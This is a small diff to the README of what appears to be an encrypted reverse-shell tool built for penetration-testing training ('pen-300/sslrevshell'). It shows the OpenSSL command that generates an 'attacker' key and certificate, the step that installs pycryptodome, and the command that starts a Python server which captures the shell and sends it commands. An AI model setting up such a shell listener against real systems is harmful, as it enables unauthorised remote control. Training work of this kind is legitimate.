@@ -80,6 +80,12 @@ C:\OpenSSLWin64\install\lib\libcrypto.lib
 openssl req -newkey rsa:2048 -nodes -keyout attacker.key -x509 -days 365 -out attacker.crt
 ```
 2- Python Script will be the server to capture the shell and send the command back to client (encrypted with aes)
+1- Install required library
+
+```
+pip3 install pycryptodome
+```
+2- Start the Server
 ```
 ┌──(kali㉿kali)-[~/Desktop/pen-300/sslrevshell]
 └─$ python3 sslserverv1.3.py      
